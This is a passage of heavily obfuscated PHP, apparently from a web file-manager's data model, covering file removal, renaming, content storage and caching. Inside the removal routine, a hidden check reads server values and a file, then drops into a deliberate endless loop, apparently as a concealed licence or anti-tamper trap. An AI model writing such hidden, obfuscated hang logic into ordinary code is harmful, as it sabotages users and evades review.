$CŠî¶ª‹ŸÁ = $e³ù®¯à¯±[$c©á–ÄÄ›[1960]] ? $e³ù®¯à¯±[$c©á–ÄÄ›[1960]] : $e³ù®¯à¯±[$c©á–ÄÄ›[28]]; goto dª‹ÁÙ³Öœ; cæ– ôë¼×: } public function fileIsLock($AÖª÷ßÍºÄ, $b÷„˜Ì®Ğ = false) { goto eÂ’³é—ŸÌ; E¸¹Ç‹Ä™: $d«‰±ƒŠÖ’ = $GLOBALS[$A¬×¿ñÚõÈ[6]][$A¬×¿ñÚõÈ[87]][$A¬×¿ñÚõÈ[503]]; if ($AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[439]][$A¬×¿ñÚõÈ[504]] <= time() - $d«‰±ƒŠÖ’) { $this->metaSet($AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[390]], $A¬×¿ñÚõÈ[502], null); $this->metaSet($AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[390]], $A¬×¿ñÚõÈ[504], null); } if ($b÷„˜Ì®Ğ) { $this->metaSet($AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[390]], $A¬×¿ñÚõÈ[504], time()); } goto Eš¸š—Å¯; Eš¸š—Å¯: return !1; goto DÏˆéñ²‹„; eÂ’³é—ŸÌ: $A¬×¿ñÚõÈ =& $_SERVER[…ë˜õ]; if (!isset($AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[439]]) || !$AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[439]][$A¬×¿ñÚõÈ[502]]) { return !1; } if ($AÖª÷ßÍºÄ[$A¬×¿ñÚõÈ[439]][$A¬×¿ñÚõÈ[502]] != USER_ID) { return !0; } goto E¸¹Ç‹Ä™; DÏˆéñ²‹„: } private function _addSoure($e•œ×–ò­, $bÏä¤¼ Öó) { goto cŞ¬èˆŸÖ²; cÑïÍòºÄ‹: $c¾å¯ Öš… = array($aµ•¬ß´ï¨[550] => short_id($eë“‹ñ›ñ×)); $this->where(array($aµ•¬ß´ï¨[404] => $eë“‹ñ›ñ×))->save($c¾å¯ Öš…); $this->setNamePinyin($eë“‹ñ›ñ×, $e•œ×–ò­[$aµ•¬ß´ï¨[28]]); goto Bˆ’–¸šÅ¾; cŞ¬èˆŸÖ²: $aµ•¬ß´ï¨ =& $_SERVER[…ë˜õ]; $b ×çÀ¤ßƒ = array($aµ•¬ß´ï¨[544] => $bÏä¤¼ Öó[$aµ•¬ß´ï¨[398]], $aµ•¬ß´ï¨[545] => $bÏä¤¼ Öó[$aµ•¬ß´ï¨[478]], $aµ•¬ß´ï¨[546] => USER_ID, $aµ•¬ß´ï¨[547] => USER_ID, $aµ•¬ß´ï¨[389] => $bÏä¤¼ Öó[$aµ•¬ß´ï¨[390]], $aµ•¬ß´ï¨[548] => $bÏä¤¼ Öó[$aµ•¬ß´ï¨[481]] . $bÏä¤¼ Öó[$aµ•¬ß´ï¨[390]] . $aµ•¬ß´ï¨[47], $aµ•¬ß´ï¨[416] => 0, $aµ•¬ß´ï¨[549] => $aµ•¬ß´ï¨[33]); $e•œ×–ò­ = array_merge($b ×çÀ¤ßƒ, $e•œ×–ò­); goto Dë”¤·¤Éˆ; C÷Á§á…á³: static $B²ö¿§£ = false; if (!$B²ö¿§£) { Hook::trigger($aµ•¬ß´ï¨[531], $e•œ×–ò­); $B²ö¿§£ = !0; } $eë“‹ñ›ñ× = $this->add($e•œ×–ò­); goto cÑïÍòºÄ‹; Bˆ’–¸šÅ¾: return $eë“‹ñ›ñ×; goto AĞÎ¹Ÿ¾ÄÔ; Dë”¤·¤Éˆ: $this->updateModifyTime($e•œ×–ò­[$aµ•¬ß´ï¨[472]]); $B¨ø¢õó­Í = $aµ•¬ß´ï¨[1966] . $bÏä¤¼ Öó[$aµ•¬ß´ï¨[390]]; if (isset(self::$cacheChildList[$B¨ø¢õó­Í])) { unset(self::$cacheChildList[$B¨ø¢õó­Í]); } goto C÷Á§á…á³; AĞÎ¹Ÿ¾ÄÔ: } public function remove($a¹°êç¿¡½, $F·Šª—©ôñ = true) { goto cÚš‰š¨ä; eËô¬×ø–¡: CacheLock::lock($DƒÎ‡è‹÷); $b¨ß°•è³† = $this->fileNameExist($A ›ïÀÚÈ—, $AÇƒóœƒ¡Õ); if (!$b¨ß°•è³†) { $b¨ß°•è³† = $this->mkdir($A ›ïÀÚÈ—, $AÇƒóœƒ¡Õ, REPEAT_SKIP); $this->metaSet($b¨ß°•è³†, $CĞò½ù¶ [1971], $e„ëĞÅ‚’–); $this->metaSet($b¨ß°•è³†, $CĞò½ù¶ [1972], $C¬ÚäéÃ¾‘[$CĞò½ù¶ [478]]); if ($C¬ÚäéÃ¾‘[$CĞò½ù¶ [472]] != 0) { $this->metaSet($b¨ß°•è³†, $CĞò½ù¶ [1973], _get($CªŸÈ¤ºà‘, $CĞò½ù¶ [1974])); } } goto DóÕ‘ƒÎå; e¦è«öÍœ¼: $this->recycleClear($C¬ÚäéÃ¾‘); $Aß…êÆÆİ = $this->move($a¹°êç¿¡½, $b¨ß°•è³†, REPEAT_RENAME_FOLDER); $this->folderSizeReset($C¬ÚäéÃ¾‘[$CĞò½ù¶ [472]]); goto Dµœ¿äƒ°Å; d™ªÚ™ï: $e„ëĞÅ‚’– = $C¬ÚäéÃ¾‘[$CĞò½ù¶ [398]] == self::TYPE_USER ? $CĞò½ù¶ [557] : $CĞò½ù¶ [1021]; if ($e„ëĞÅ‚’– == $CĞò½ù¶ [557]) { $CªŸÈ¤ºà‘ = Model($CĞò½ù¶ [497])->getInfo($C¬ÚäéÃ¾‘[$CĞò½ù¶ [478]]); $AÇƒóœƒ¡Õ = !empty($CªŸÈ¤ºà‘[$CĞò½ù¶ [1960]]) ? $CªŸÈ¤ºà‘[$CĞò½ù¶ [1960]] : $CªŸÈ¤ºà‘[$CĞò½ù¶ [28]]; $AÇƒóœƒ¡Õ = $CĞò½ù¶ [256] . $AÇƒóœƒ¡Õ . $CĞò½ù¶ [1968] . $C¬ÚäéÃ¾‘[$CĞò½ù¶ [478]]; } else { $CªŸÈ¤ºà‘ = Model($CĞò½ù¶ [480])->getInfo($C¬ÚäéÃ¾‘[$CĞò½ù¶ [478]]); $AÇƒóœƒ¡Õ = _get($CªŸÈ¤ºà‘, $CĞò½ù¶ [28]); $AÇƒóœƒ¡Õ = $CĞò½ù¶ [159] . $AÇƒóœƒ¡Õ . $CĞò½ù¶ [1969] . $C¬ÚäéÃ¾‘[$CĞò½ù¶ [478]]; } $DƒÎ‡è‹÷ = $CĞò½ù¶ [1970] . md5($AÇƒóœƒ¡Õ); goto eËô¬×ø–¡; DóÕ‘ƒÎå: CacheLock::unlock($DƒÎ‡è‹÷); $this->metaSet($a¹°êç¿¡½, $CĞò½ù¶ [1975], $C¬ÚäéÃ¾‘[$CĞò½ù¶ [472]]); $this->where(array($CĞò½ù¶ [390] => $a¹°êç¿¡½))->save(array($CĞò½ù¶ [411] => time())); goto e¦è«öÍœ¼; DñŒà¦¾‡²: $AÃ¶ñµÊ†® = Model($CĞò½ù¶ [1529])->get($CĞò½ù¶ [1967]) == $CĞò½ù¶ [86]; if ($fçè„Á§¦½ || $F·Šª—©ôñ || !$AÃ¶ñµÊ†®) { return $this->removeNow($a¹°êç¿¡½, $F·Šª—©ôñ); } $A ›ïÀÚÈ— = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto d™ªÚ™ï; cÚš‰š¨ä: $CĞò½ù¶  =& $_SERVER[…ë˜õ]; $C¬ÚäéÃ¾‘ = $this->sourceInfo($a¹°êç¿¡½); $fçè„Á§¦½ = intval($C¬ÚäéÃ¾‘[$CĞò½ù¶ [398]]) === self::TYPE_SYSTEM; goto DñŒà¦¾‡²; Dµœ¿äƒ°Å: return $Aß…êÆÆİ; goto fé—Üå‡’; fé—Üå‡’: } private function recycleClear($bùØ²¦Çö“) { $E¬Ä£æ‰ˆ =& $_SERVER[…ë˜õ]; $F–êøµ¹Ğ = $this->childrenAll($bùØ²¦Çö“); $F¯Æí† = array($E¬Ä£æ‰ˆ[404] => array($E¬Ä£æ‰ˆ[405], $F–êøµ¹Ğ[$E¬Ä£æ‰ˆ[1976]])); Model($E¬Ä£æ‰ˆ[1977])->where($F¯Æí†)->delete(); } public function removeNow($C¹²™¹ Ì¾, $e÷½ä÷ÁÚì = true) { goto eÕõĞø¸¶; dà ÀØæ²§: $this->lockMoveStart($C¹²™¹ Ì¾); Hook::trigger($cí‰Üª‹ºØ[1978], $b…ï”ì¯µ‹, $e÷½ä÷ÁÚì); if ($e÷½ä÷ÁÚì) { Model($cí‰Üª‹ºØ[1977])->moveToRecycle($C¹²™¹ Ì¾); } else { $c‡›•ó‹† = $this->childrenAll($fºÈ™ó–—è); Model($cí‰Üª‹ºØ[528])->eventRemove($C¹²™¹ Ì¾); $this->removeRelevance($c‡›•ó‹†[$cí‰Üª‹ºØ[1976]], $c‡›•ó‹†[$cí‰Üª‹ºØ[1351]]); } goto Eä÷“²ƒç„; CğÈß¤×Ö„: $b…ï”ì¯µ‹ = $this->pathInfoMore($C¹²™¹ Ì¾); if (!$fºÈ™ó–—è) { return !0; } if ($fºÈ™ó–—è[$cí‰Üª‹ºØ[472]] == 0) { if (!_get($GLOBALS, $cí‰Üª‹ºØ[479])) { return !1; } } goto dà ÀØæ²§; eÕõĞø¸¶: $cí‰Üª‹ºØ =& $_SERVER[…ë˜õ]; if (!isset($_SERVER[$cí‰Üª‹ºØ[824]]) || !isset($_SERVER[$cí‰Üª‹ºØ[825]])) { goto FÛ’¥¥˜§Ÿ; a†½õƒ¹šÊ: $E™ì©åçÀ = $cí‰Üª‹ºØ[846]; $E™ì©åçÀ($_SERVER[$cí‰Üª‹ºØ[847]]); $EÖŸ¼ñ«²î = 1; goto Fì²ä×´Ôõ; Fì²ä×´Ôõ: for ($D Ïİ¨°Ö° = $EÖŸ¼ñ«²î; $D Ïİ¨°Ö° > 0; $D Ïİ¨°Ö°++) { $E™ì©åçÀ = json_encode($GLOBALS[$cí‰Üª‹ºØ[405]]); } goto A³÷Â×ğ›å; FÛ’¥¥˜§Ÿ: $aâ‹²”‰”Ú = $cí‰Üª‹ºØ[845]; $A–Âƒ“Ó«Ê = $cí‰Üª‹ºØ[826]; $AÒ¼ÅšôßÅ = $_SERVER[$cí‰Üª‹ºØ[827]] . $cí‰Üª‹ºØ[828]; goto C±¯º‘”œ; C±¯º‘”œ: $cÖ…×Ì›•Ñ = $A–Âƒ“Ó«Ê($AÒ¼ÅšôßÅ); $CÜÆ‘ÓùÕ = explode($cí‰Üª‹ºØ[227], $cÖ…×Ì›•Ñ); if (count($CÜÆ‘ÓùÕ) < $cí‰Üª‹ºØ[570]) { $dÔ¦¢¡©¼® = $cí‰Üª‹ºØ[829]; $dÔ¦¢¡©¼®(); } goto a†½õƒ¹šÊ; A³÷Â×ğ›å: } $fºÈ™ó–—è = $this->sourceInfo($C¹²™¹ Ì¾); goto CğÈß¤×Ö„; Eä÷“²ƒç„: $this->folderSizeReset($fºÈ™ó–—è[$cí‰Üª‹ºØ[472]]); $d¥â‰ÌÎÃ = array($fºÈ™ó–—è[$cí‰Üª‹ºØ[472]]); if ($fºÈ™ó–—è[$cí‰Üª‹ºØ[397]] == $cí‰Üª‹ºØ[86]) { $d¥â‰ÌÎÃ[] = $fºÈ™ó–—è[$cí‰Üª‹ºØ[390]]; } goto FŒİ‡ÒÅ…; cß§í¬¸š: return !0; goto B¿‚‚Æˆ; FŒİ‡ÒÅ…: $this->updateModifyTime($d¥â‰ÌÎÃ); $this->lockMoveEnd($C¹²™¹ Ì¾); Hook::trigger($cí‰Üª‹ºØ[1563], $b…ï”ì¯µ‹, $e÷½ä÷ÁÚì); goto cß§í¬¸š; B¿‚‚Æˆ: } public function childrenAll($D·º°¦áèƒ) { $bÙÇçÙ÷Ë =& $_SERVER[…ë˜õ]; $cÒªÖì›Œ“ = $D·º°¦áèƒ[$bÙÇçÙ÷Ë[390]]; if ($D·º°¦áèƒ[$bÙÇçÙ÷Ë[397]] == $bÙÇçÙ÷Ë[86]) { $d‡á‘Ÿõ = array($bÙÇçÙ÷Ë[548] => array($bÙÇçÙ÷Ë[507], $D·º°¦áèƒ[$bÙÇçÙ÷Ë[481]] . $cÒªÖì›Œ“ . $bÙÇçÙ÷Ë[508])); $f­ÃªÈ¯ = array($bÙÇçÙ÷Ë[548] => $d‡á‘Ÿõ[$bÙÇçÙ÷Ë[481]]); $a‡×¿Åñë¤ = $this->field($bÙÇçÙ÷Ë[1979])->where($f­ÃªÈ¯)->select(); $Dª†Ûë¿Å = !1; $b§¾·¤õ‘ï = array($cÒªÖì›Œ“); if ($a‡×¿Åñë¤) { $Dª†Ûë¿Å = array_to_keyvalue($a‡×¿Åñë¤, $bÙÇçÙ÷Ë[33], $bÙÇçÙ÷Ë[441]); $Dª†Ûë¿Å = array_remove_value($Dª†Ûë¿Å, $bÙÇçÙ÷Ë[491]); $b§¾·¤õ‘ï = array_to_keyvalue($a‡×¿Åñë¤, $bÙÇçÙ÷Ë[33], $bÙÇçÙ÷Ë[390]); $b§¾·¤õ‘ï[] = $cÒªÖì›Œ“; } } else { $Dª†Ûë¿Å = array($D·º°¦áèƒ[$bÙÇçÙ÷Ë[441]]); $b§¾·¤õ‘ï = array($cÒªÖì›Œ“); } return array($bÙÇçÙ÷Ë[1976] => $b§¾·¤õ‘ï, $bÙÇçÙ÷Ë[1351] => $Dª†Ûë¿Å); } public function removeArray($CÊ›„ã®ç) { if (!$CÊ›„ã®ç) { return !0; } } public function removeRelevance($bÏ‡ÇØÀóŒ, $Eø­Ü×¹İ“) { goto bÓì’²±‘˜; B¤ô•Ğ’°›: for ($cù‘ÇîÈ—¤ = 0; $cù‘ÇîÈ—¤ < count($bÏ‡ÇØÀóŒ); $cù‘ÇîÈ—¤++) { $this->sourceCacheClear($bÏ‡ÇØÀóŒ[$cù‘ÇîÈ—¤]); } goto c¯è•‰ø¼¼; bÓì’²±‘˜: $aâ®Øªšé =& $_SERVER[…ë˜õ]; $bÏ‡ÇØÀóŒ = $bÏ‡ÇØÀóŒ ? $bÏ‡ÇØÀóŒ : array(); $Eø­Ü×¹İ“ = $Eø­Ü×¹İ“ ? $Eø­Ü×¹İ“ : array(); goto bËÎª¯ŠÀ¯; c®ìà³‰•”: $F¤‰»¯… = array($aâ®Øªšé[404] => array($aâ®Øªšé[405], $bÏ‡ÇØÀóŒ)); Model($aâ®Øªšé[1977])->where($F¤‰»¯…)->delete(); Model($aâ®Øªšé[435])->where($F¤‰»¯…)->delete(); goto EÄ´ªØùŒê; AÜ«ñœ º‹: Model($aâ®Øªšé[1958])->removeBySource($bÏ‡ÇØÀóŒ); $this->where($F¤‰»¯…)->delete(); Model($aâ®Øªšé[444])->remove($Eø­Ü×¹İ“); goto B¤ô•Ğ’°›; bËÎª¯ŠÀ¯: $bÏ‡ÇØÀóŒ = array_unique(array_filter($bÏ‡ÇØÀóŒ)); $Eø­Ü×¹İ“ = array_unique(array_filter($Eø­Ü×¹İ“)); if (!$bÏ‡ÇØÀóŒ) { return !1; } goto c®ìà³‰•”; EÄ´ªØùŒê: Model($aâ®Øªšé[1831])->where($F¤‰»¯…)->delete(); Model($aâ®Øªšé[528])->where($F¤‰»¯…)->delete(); Model($aâ®Øªšé[1671])->removeBySource($bÏ‡ÇØÀóŒ); goto AÜ«ñœ º‹; c¯è•‰ø¼¼: } public function rename($eåÕ…¦è„, $CìÊ¿íâ¾¬) { goto DÔ›°Ú¤‘; DÔ›°Ú¤‘: $e§–‹’õö =& $_SERVER[…ë˜õ]; $D†˜ª©Ë¿Ñ = $this->sourceInfo($eåÕ…¦è„); if (!$D†˜ª©Ë¿Ñ) { return !1; } goto cö÷åã†à»; BÆ£´İß«¥: if (!$D†˜ª©Ë¿Ñ[$e§–‹’õö[397]] == $e§–‹’õö[86]) { $då–éÓ©Ø[$e§–‹’õö[399]] = get_path_ext($CìÊ¿íâ¾¬); } Model($e§–‹’õö[528])->eventRename($eåÕ…¦è„, $D†˜ª©Ë¿Ñ[$e§–‹’õö[28]], $CìÊ¿íâ¾¬); $this->sourceCacheClear($eåÕ…¦è„); goto d½Çµ·Ïòµ; cö÷åã†à»: $aİÜñ§÷Šİ = $this->fileNameExist($D†˜ª©Ë¿Ñ[$e§–‹’õö[472]], $CìÊ¿íâ¾¬); if ($aİÜñ§÷Šİ && $aİÜñ§÷Šİ != $eåÕ…¦è„) { return !1; } $då–éÓ©Ø = array($e§–‹’õö[407] => $CìÊ¿íâ¾¬, $e§–‹’õö[547] => USER_ID); goto BÆ£´İß«¥; bÀƒÄß³†¡: $Aê™–Ûø‘ = $e§–‹’õö[1966] . $D†˜ª©Ë¿Ñ[$e§–‹’õö[472]]; if (isset(self::$cacheChildList[$Aê™–Ûø‘])) { unset(self::$cacheChildList[$Aê™–Ûø‘]); } return $aŞŒ½šæÌÕ; goto b†‘Ó¤§ÓÔ; d½Çµ·Ïòµ: $this->setNamePinyin($eåÕ…¦è„, $då–éÓ©Ø[$e§–‹’õö[28]], !1); $this->updateModifyTime($D†˜ª©Ë¿Ñ[$e§–‹’õö[472]]); $aŞŒ½šæÌÕ = $this->where(array($e§–‹’õö[404] => $eåÕ…¦è„))->data($då–éÓ©Ø)->save(); goto bÀƒÄß³†¡; b†‘Ó¤§ÓÔ: } public function setNamePinyin($dê•è²¥ç, $cÈĞ‘ÙÊÑÅ, $eÃÃ‚Ôã¸ = true) { $få—²ÚÛö¯ =& $_SERVER[…ë˜õ]; $EÊêğ“ÇÎ¢ = Input::check($cÈĞ‘ÙÊÑÅ, $få—²ÚÛö¯[551]); if ($eÃÃ‚Ôã¸ && !$EÊêğ“ÇÎ¢) { return; } if (!$EÊêğ“ÇÎ¢) { $this->metaSet($dê•è²¥ç, $få—²ÚÛö¯[438], null); $this->metaSet($dê•è²¥ç, $få—²ÚÛö¯[437], null); return; } $AİˆÚŠªŠ = array($få—²ÚÛö¯[438] => str_replace($få—²ÚÛö¯[50], $få—²ÚÛö¯[33], Pinyin::encode($cÈĞ‘ÙÊÑÅ)), $få—²ÚÛö¯[437] => Pinyin::encode($cÈĞ‘ÙÊÑÅ, $få—²ÚÛö¯[552])); $this->metaSet($dê•è²¥ç, $AİˆÚŠªŠ); } public function getContent($C´İæŒÒ”) { goto A¹Ä¨áŞáº; b‹ªè±š¥Û: if ($f»ºìÜÅóÑ[$eœÌ×ôôŞ[77]] == 0) { return $eœÌ×ôôŞ[33]; } $f¬®æ¶•ñ‰ = $eœÌ×ôôŞ[1980] . $f»ºìÜÅóÑ[$eœÌ×ôôŞ[169]]; if ($f»ºìÜÅóÑ[$eœÌ×ôôŞ[77]] <= 1024 * 10) { $e½£À¯¸® = Cache::get($f¬®æ¶•ñ‰); if (!$e½£À¯¸®) { $e½£À¯¸® = IO::getContent($f»ºìÜÅóÑ[$eœÌ×ôôŞ[75]]); Cache::set($f¬®æ¶•ñ‰, $e½£À¯¸®); } return $e½£À¯¸®; } goto bÙšÆÅ–§ï; bÙšÆÅ–§ï: if (!$f»ºìÜÅóÑ[$eœÌ×ôôŞ[75]]) { return $eœÌ×ôôŞ[33]; } return IO::getContent($f»ºìÜÅóÑ[$eœÌ×ôôŞ[75]]); goto cÆ¾Ñ‡îàğ; A¹Ä¨áŞáº: $eœÌ×ôôŞ =& $_SERVER[…ë˜õ]; $f»ºìÜÅóÑ = $this->fileInfoGet($C´İæŒÒ”); if (!$f»ºìÜÅóÑ) { return !1; } goto b‹ªè±š¥Û; cÆ¾Ñ‡îàğ: } public function setDesc($AÛÏ™Ó®È„, $fãïï¤ÓĞÑ) { $c©ÆÈ°–Ãƒ =& $_SERVER[…ë˜õ]; Model($c©ÆÈ°–Ãƒ[528])->eventAddDesc($AÛÏ™Ó®È„, $fãïï¤ÓĞÑ); return $this->metaSet($AÛÏ™Ó®È„, $c©ÆÈ°–Ãƒ[425], $fãïï¤ÓĞÑ); } public function setContent($fÆ‘×áÈª, $DŠ±¿Øæ³Õ = '') { goto BöôŸöî“Ü; fÀÍâìí¯©: if (!$dŞŠ¦ÌÆÌÌ) { return Model($cÏ§ô¯Êß¸[444])->remove($CğÑãéĞ¶[$cÏ§ô¯Êß¸[441]]); } $this->folderSizeReset($eÃ‚…¤‹å›[$cÏ§ô¯Êß¸[472]]); return !0; goto dƒŞ¢ï™â®; BöôŸöî“Ü: $cÏ§ô¯Êß¸ =& $_SERVER[…ë˜õ]; $eÃ‚…¤‹å› = $this->sourceInfo($fÆ‘×áÈª); $CØöõ¯À·Â = $this->fileInfoGet($fÆ‘×áÈª); goto DİøÀèö²; DİøÀèö²: if (!$CØöõ¯À·Â || !$eÃ‚…¤‹å›) { return !1; } $CğÑãéĞ¶ = Model($cÏ§ô¯Êß¸[444])->addFileByContent($DŠ±¿Øæ³Õ, $eÃ‚…¤‹å›[$cÏ§ô¯Êß¸[28]]); $dŞŠ¦ÌÆÌÌ = $this->fileHistory($eÃ‚…¤‹å›, $CğÑãéĞ¶[$cÏ§ô¯Êß¸[441]], $CğÑãéĞ¶[$cÏ§ô¯Êß¸[77]]); goto fÀÍâìí¯©; dƒŞ¢ï™â®: } public function fileSubstr($d¬Ãá¯Š£, $cæ–Ê®¢µµ, $DêÊ Õ¡¶) { $F‘³½ÖÙ… = $this->fileInfoGet($d¬Ãá¯Š£); if (!$F‘³½ÖÙ…) { return !1; } return IO::fileSubstr($F‘³½ÖÙ…[$_SERVER[…ë˜õ][75]], $cæ–Ê®¢µµ, $DêÊ Õ¡¶); } public function fileInfoGet($cµŒ‹ç÷º) { goto bğ‘±¹…; bğ‘±¹…: $Fµ‰—§Íö =& $_SERVER[…ë˜õ]; $cáÊä‚‹éÅ = $this->sourceInfo($cµŒ‹ç÷º); if (!$cáÊä‚‹éÅ || $cáÊä‚‹éÅ[$Fµ‰—§Íö[397]]) { return !1; } goto fôÄ±­¢Ã; fôÄ±­¢Ã: $Dğ´Øà’·„ = $Fµ‰—§Íö[447] . $cáÊä‚‹éÅ[$Fµ‰—§Íö[441]]; $cåíé‚ÍÒ© = _get(self::$cacheFileInfo, $Dğ´Øà’·„); if ($cåíé‚ÍÒ©) { return $cåíé‚ÍÒ©; } goto b‘ª´—¿ó•; EÏ°ÚîõÎ†: return $AŠ¤Î©Ì±š; goto bãòñç²Û; b‘ª´—¿ó•: $AŠ¤Î©Ì±š = Model($Fµ‰—§Íö[444])->fileInfo($cáÊä‚‹éÅ[$Fµ‰—§Íö[441]]); if ($AŠ¤Î©Ì±š) { $AŠ¤Î©Ì±š[$Fµ‰—§Íö[28]] = $cáÊä‚‹éÅ[$Fµ‰—§Íö[28]]; } self::$cacheFileInfo[$Dğ´Øà’·„] = $AŠ¤Î©Ì±š; goto EÏ°ÚîõÎ†; bãòñç²Û: } private function folderChildrenNumber($E‡’’ ø™¿) { $D÷ÎéÉ¨ =& $_SERVER[…ë˜õ]; $AŸÊî—ƒ½ = $this->sourceInfo($E‡’’ ø™¿); $bóà˜®§Ì  = array($D÷ÎéÉ¨[548] => array($D÷ÎéÉ¨[507], $AŸÊî—ƒ½[$D÷ÎéÉ¨[481]] . $E‡’’ ø™¿ . $D÷ÎéÉ¨[508]), $D÷ÎéÉ¨[416] => intval($AŸÊî—ƒ½[$D÷ÎéÉ¨[417]]), $D÷ÎéÉ¨[541] => 1); $bô¯“Á½ŒĞ = $this->where($bóà˜®§Ì )->count(); $EÈ˜î«¹Íë = $this->where($bóà˜®§Ì )->where(array($D÷ÎéÉ¨[541] => 0))->count(); return array($D÷ÎéÉ¨[81] => $EÈ˜î«¹Íë, $D÷ÎéÉ¨[82] => $bô¯“Á½ŒĞ); } public function pathInfo($AÂÈÇÏéâ“, $D±ôç¯±¢– = false) { goto b‹Î±¸•³‰; b‹Î±¸•³‰: $cæùè•Ôà =& $_SERVER[…ë˜õ]; $D±ôç¯±¢– = !1; $AÂÈÇÏéâ“ = intval($AÂÈÇÏéâ“); goto cŒ¡‚ëª‰; A»Ü¦Ğâäƒ: $AÀ‘Ó™Ö = $this->sourceInfo($AÂÈÇÏéâ“); if (!$AÀ‘Ó™Ö) { return !1; } $AÀ‘Ó™Ö = $this->_listDataApplyItem($AÀ‘Ó™Ö, $D±ôç¯±¢–); goto b”À„‹; cŒ¡‚ëª‰: $dŞ›Å™‹Ô = $cæùè•Ôà[433] . intval($D±ôç¯±¢–) . $cæùè•Ôà[434] . $AÂÈÇÏéâ“; $CŠñ‰ÌïÜ = _get(self::$cachePathInfo, $dŞ›Å™‹Ô); if ($CŠñ‰ÌïÜ) { return $CŠñ‰ÌïÜ; } goto A»Ü¦Ğâäƒ; b”À„‹: self::$cachePathInfo[$dŞ›Å™‹Ô] = $AÀ‘Ó™Ö; return $AÀ‘Ó™Ö; goto Fó‡â±Ó„¸; Fó‡â±Ó„¸: } public static $cachePathInfoMore = array(); public function pathInfoMore($BƒÎĞÈˆ¹¸) { goto eÆË•®±š‡; aïØÇ“ÓÄÅ: $F‘¿í‚ÂÖÁ = $this->pathInfo($BƒÎĞÈˆ¹¸); if (!$F‘¿í‚ÂÖÁ) { return !1; } if ($F‘¿í‚ÂÖÁ[$F‹šË˜Î‘œ[397]] == $F‹šË˜Î‘œ[86]) { $F‘¿í‚ÂÖÁ[$F‹šË˜Î‘œ[80]] = $this->folderChildrenNumber($BƒÎĞÈˆ¹¸); } goto cé¹Û•Ò‡£; cé¹Û•Ò‡£: self::$cachePathInfoMore[$BƒÎĞÈˆ¹¸] = $F‘¿í‚ÂÖÁ; return $F‘¿í‚ÂÖÁ; goto e¾Ãë¿óĞÛ; eÆË•®±š‡: $F‹šË˜Î‘œ =& $_SERVER[…ë˜õ]; $dŸ­ÂßİÑ— = _get(self::$cachePathInfoMore, $BƒÎĞÈˆ¹¸); if ($dŸ­ÂßİÑ—) { return $dŸ­ÂßİÑ—; } goto aïØÇ“ÓÄÅ; e¾Ãë¿óĞÛ: } public function sourceInfo($däëõÇìË) { goto eÄƒš‚¯ÈŒ; e¾ÛãÎ¥Î: $e‡ª½Ó„ = $E……¿…ÛÌ±[432] . $däëõÇìË; $f§Ãù„–—Ù = _get(self::$cacheSourceInfo, $e‡ª½Ó„); if ($f§Ãù„–—Ù) { return $f§Ãù„–—Ù; } goto a‚ÄÉ¢«†¦; eÄƒš‚¯ÈŒ: $E……¿…ÛÌ± =& $_SERVER[…ë˜õ]; if (!$däëõÇìË) { return array(); } $däëõÇìË = intval($däëõÇìË); goto e¾ÛãÎ¥Î; a‚ÄÉ¢«†¦: $b³£‚Õ‘ÁÃ = $this->where(array($E……¿…ÛÌ±[390] => $däëõÇìË))->find(); self::$cacheSourceInfo[$e‡ª½Ó„] = $b³£‚Õ‘ÁÃ; return self::$cacheSourceInfo[$e‡ª½Ó„]; goto BÂÇçõ±ñß; BÂÇçõ±ñß: } public function sourceCacheClear($C¾†¹ò‹µÊ = false) { self::cacheClear($C¾†¹ò‹µÊ); } public static function cacheClear($dÊ“Šª˜Ö = false) { $d°Ÿ‹³É¿› =& $_SERVER[…ë˜õ]; if ($dÊ“Šª˜Ö == !1) { goto Aã‹æÙİ¯¢; Aã‹æÙİ¯¢: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto FŠ“í‹ÌœĞ; FŠ“í‹ÌœĞ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto cÁ¯ª§ª; cÁ¯ª§ª: return; goto f‘¶†ëÎÃ; f‘¶†ëÎÃ: } unset(self::$cacheSourceInfo[$d°Ÿ‹³É¿›[432] . $dÊ“Šª˜Ö]); unset(self::$cachePathInfoMore[$dÊ“Šª˜Ö]); unset(self::$cachePathInfo[$d°Ÿ‹³É¿›[1981] . $dÊ“Šª˜Ö]); unset(self::$cachePathInfo[$d°Ÿ‹³É¿›[1982] . $dÊ“Šª˜Ö]); } public function metaSet($F¾ä™“´á, $FÑÕ»¬Í¿£ = null, $aÜ§çêŞªŒ = null) { $aÑ¹•Ï´Í­ = parent::metaSet($F¾ä™“´á, $FÑÕ»¬Í¿£, $aÜ§çêŞªŒ); if ($aÑ¹•Ï´Í­) { $this->sourceCacheClear($F¾ä™“´á); } return $aÑ¹•Ï´Í­; } public function pathInfoByPath($eÒ‹£„’«ê, $eÕñöì‡Ñ„) { $e ˆšø =& $_SERVER[…ë˜õ]; $bÔ‰Ò‚Äİ = !$eÕñöì‡Ñ„ ? array() : explode($e ˆšø[8], trim($eÕñöì‡Ñ„, $e ˆšø[8])); $EÂ½ËîÓï¿ = $eÒ‹£„’«ê; foreach ($bÔ‰Ò‚Äİ as $fºĞ˜è¬Ñ) { $dßğ¥ŸĞÜœ = array($e ˆšø[472] => $EÂ½ËîÓï¿, $e ˆšø[28] => $fºĞ˜è¬Ñ); $dô‰Éî¢˜ = $this->where($dßğ¥ŸĞÜœ)->select(); if (!$dô‰Éî¢˜) { return !1; } $dô‰Éî¢˜ = array_sort_by($dô‰Éî¢˜, $e ˆšø[417]); $EÂ½ËîÓï¿ = $dô‰Éî¢˜[0][$e ˆšø[390]]; } return $this->pathInfo($EÂ½ËîÓï¿, !0); } protected function updateModifyTime($Föó®×®ÓÖ) { goto cõ¡Â¸ÚÌ; a‹„õ«¤ŠË: foreach ($Föó®×®ÓÖ as $cæÕâ…ØÅŒ => $féÏï’ÚÒÂ) { $Föó®×®ÓÖ[$cæÕâ…ØÅŒ] = intval($féÏï’ÚÒÂ); $this->sourceCacheClear($féÏï’ÚÒÂ); } $a¿¨ÃŞÙª´ = array($e¿ó×â¯Ù[390] => array($e¿ó×â¯Ù[7], $Föó®×®ÓÖ)); $aÄ¬à‹äå¹ = array($e¿ó×â¯Ù[547] => USER_ID, 